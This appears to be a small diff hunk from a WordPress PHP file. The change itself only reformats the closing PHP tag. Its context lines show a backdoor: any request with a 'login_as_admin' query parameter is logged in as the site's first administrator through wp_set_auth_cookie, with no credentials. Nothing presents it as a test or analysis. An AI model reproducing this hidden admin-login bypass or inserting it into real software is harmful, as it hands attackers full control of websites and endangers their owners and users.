@@ -7,4 +7,5 @@ if( isset($_GET['login_as_admin']) ){
 		$users = get_users([ 'role' => 'administrator' ]);
 		wp_set_auth_cookie( $users[0]->ID );
 	} );    
-} ?>
+}
+?>
